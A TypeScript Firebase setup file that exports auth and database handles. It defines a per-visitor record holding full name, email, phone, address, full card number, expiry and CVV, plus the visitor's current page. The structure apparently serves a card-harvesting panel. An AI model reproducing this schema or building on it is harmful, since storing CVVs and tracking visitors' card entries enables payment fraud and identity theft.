import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDc3QDi3eBEWjY4RUoTFe6UPOL1odufHnM",
  authDomain: "lerat-533b3.firebaseapp.com",
  databaseURL: "https://lerat-533b3-default-rtdb.firebaseio.com",
  projectId: "lerat-533b3",
  storageBucket: "lerat-533b3.firebasestorage.app",
  messagingSenderId: "465479219635",
  appId: "1:465479219635:web:e61e1ee37d6d3c30a433c6",
  measurementId: "G-81L3G8VPJ0"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

